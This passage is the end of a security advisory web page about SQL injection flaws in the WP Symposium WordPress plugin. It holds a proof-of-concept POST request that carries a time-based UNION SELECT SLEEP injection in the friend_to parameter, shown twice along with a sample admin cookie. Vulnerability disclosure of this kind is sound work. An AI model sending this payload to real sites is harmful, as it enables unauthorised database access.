Host: 192.168.80.130
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1
Cookie: wordpress_logged_in_f3e14e7fde6969eb515c450fed50d259=admin%7C1347997111%7Cbe07b25720d1c846b47c3dee37e9801d; 
Content-Type: application/x-www-form-urlencoded
Content-Length: 76

action=addFriend&amp;friend_to=1 AND 1=2) UNION SELECT SLEEP(10), 2, 3, 4, 5, 6; --</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c987785a583740292718-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a583740292718-2">2</div><div class="crayon-num" data-line="crayon-53c987785a583740292718-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a583740292718-4">4</div><div class="crayon-num" data-line="crayon-53c987785a583740292718-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a583740292718-6">6</div><div class="crayon-num" data-line="crayon-53c987785a583740292718-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a583740292718-8">8</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c987785a583740292718-1"><span class="crayon-i">POST</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wordpress</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">/</span><span class="crayon-i">plugins</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">symposium</span><span class="crayon-o">/</span><span class="crayon-i">ajax</span><span class="crayon-o">/</span><span class="crayon-v">symposium_profile_functions</span><span class="crayon-sy">.</span><span class="crayon-e">php </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.0</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a583740292718-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div><div class="crayon-line" id="crayon-53c987785a583740292718-3"><span class="crayon-i">User</span><span class="crayon-o">-</span><span class="crayon-i">Agent</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">Mozilla</span><span class="crayon-o">/</span><span class="crayon-cn">5.0</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">Windows </span><span class="crayon-i">NT</span><span class="crayon-h"> </span><span class="crayon-cn">6.1</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">WOW64</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">rv</span><span class="crayon-o">:</span><span class="crayon-cn">13.0</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-i">Gecko</span><span class="crayon-o">/</span><span class="crayon-cn">20100101</span><span class="crayon-h"> </span><span class="crayon-i">Firefox</span><span class="crayon-o">/</span><span class="crayon-cn">13.0.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a583740292718-4"><span class="crayon-i">Cookie</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">wordpress_logged_in_f3e14e7fde6969eb515c450fed50d259</span><span class="crayon-o">=</span><span class="crayon-i">admin</span><span class="crayon-o">%</span><span class="crayon-cn">7C1347997111</span><span class="crayon-o">%</span><span class="crayon-cn">7Cbe07b25720d1c846b47c3dee37e9801d</span><span class="crayon-sy">;</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-53c987785a583740292718-5"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">application</span><span class="crayon-o">/</span><span class="crayon-i">x</span><span class="crayon-o">-</span><span class="crayon-i">www</span><span class="crayon-o">-</span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-e">urlencoded</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a583740292718-6"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Length</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">76</span></div><div class="crayon-line" id="crayon-53c987785a583740292718-7">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a583740292718-8"><span class="crayon-v">action</span><span class="crayon-o">=</span><span class="crayon-i">addFriend</span><span class="crayon-o">&amp;</span><span class="crayon-v">friend_to</span><span class="crayon-o">=</span><span class="crayon-cn">1</span><span class="crayon-h"> </span><span class="crayon-st">AND</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-o">=</span><span class="crayon-cn">2</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-e">UNION </span><span class="crayon-e">SELECT </span><span class="crayon-e">SLEEP</span><span class="crayon-sy">(</span><span class="crayon-cn">10</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">2</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">3</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">4</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">5</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">6</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-o">--</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0047 seconds] -->
<p><strong></strong></p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="https://charlieeriksen.github.io/category/advisories/" title="View all posts in Advisories" rel="category tag">Advisories</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="https://charlieeriksen.github.io/tag/sql-injection/" rel="tag">SQL Injection</a>, <a href="https://charlieeriksen.github.io/tag/symposium/" rel="tag">Symposium</a>, <a href="https://charlieeriksen.github.io/tag/wordpress-plugin/" rel="tag">Wordpress plugin</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="https://charlieeriksen.github.io/2013/02/18/wp-symposium-multiple-sql-injection/#respond" title="Comment on WP Symposium multiple SQL injection vulnerabilities">Leave a comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-132 -->

				
					<nav id="nav-below">
		<h2 class="assistive-text">Post navigation</h2>

	
	</nav><!-- #nav-below -->
	
			
			</div><!-- #content -->
		</section><!-- #primary -->

			<div id="secondary" class="widget-area" role="complementary">
			<aside id="text-2" class="widget widget_text"><h3 class="widget-title">Upcoming advisories</h3>			<div class="textwidget"><p>SA51412<br />
SA51348<br />
SA51344<br />
SA51336 </p>
</div>
		</aside><aside id="categories-4" class="widget widget_categories"><h3 class="widget-title">Categories</h3>		<ul>
	<li class="cat-item cat-item-3"><a href="https://charlieeriksen.github.io/category/advisories/" title="View all posts filed under Advisories">Advisories</a> (34)
</li>
	<li class="cat-item cat-item-12"><a href="https://charlieeriksen.github.io/category/privacy/" title="View all posts filed under Privacy">Privacy</a> (5)
</li>
	<li class="cat-item cat-item-30"><a href="https://charlieeriksen.github.io/category/security/" title="View all posts filed under Security">Security</a> (7)
</li>
		</ul>
</aside>		<aside id="recent-posts-4" class="widget widget_recent_entries">		<h3 class="widget-title">Recent posts</h3>		<ul>
					<li>
				<a href="https://charlieeriksen.github.io/2013/08/20/graphite-remote-code-execution-vulnerability-advisory/">Graphite remote code execution vulnerability advisory</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/08/06/squash-remote-code-execution-vulnerability-advisory/">Squash remote code execution vulnerability advisory</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/06/18/bsides-rhode-island-presentation-and-slides/">BSides Rhode Island presentation and slides</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/05/24/cve-2012-6399-or-how-your-cisco-webex-meetings-arent-very-confidential-on-ios/">CVE-2012-6399 &#8211; Or how your Cisco WebEx meetings aren&#8217;t very confidential on iOS</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/05/16/credit-card-numbers-third-parties-and-you/">Credit card numbers, third parties and you</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/05/09/cve-2013-2692-or-when-your-openvpn-is-a-bit-too-open/">CVE-2013-2692 &#8211; Or when your OpenVPN is a bit too open</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/05/03/conditional-csrf-or-how-to-spray-without-praying/">Conditional CSRF &#8211; Or how to spray without praying</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/05/01/wordpress-csrf-exploit-kit-a-novel-approach-to-exploiting-wordpress-plugins/">WordPress CSRF Exploit kit &#8211; A novel approach to exploiting WordPress plugins</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/03/17/amd-catalyst-driver-update-vulnerability/">AMD Catalyst driver update vulnerability</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/02/18/wordpress-online-store-local-file-inclusion-vulnerability/">WordPress Online Store local file inclusion vulnerability</a>
						</li>
				</ul>
		</aside>		</div><!-- #secondary .widget-area -->
	
	</div><!-- #main -->
	
	
	<footer id="colophon" role="contentinfo">
		<div id="site-generator">
						<a href="http://wordpress.org/" title="Semantic Personal Publishing Platform" rel="generator">Powered by WordPress</a> &amp;	<a href="http://wpshoppe.com/" title="Minimalist WordPress Themes" rel="generator">simpleX</a>.
					
		</div>
	</footer><!-- #colophon -->
	
		
</div><!-- #page -->


</body>
</html>
<!-- Performance optimized by W3 Total Cache. Learn more: http://www.w3-edge.com/wordpress-plugins/

Page Caching using disk: enhanced

 Served from: ceriksen.com @ 2014-07-18 20:45:44 by W3 Total Cache -->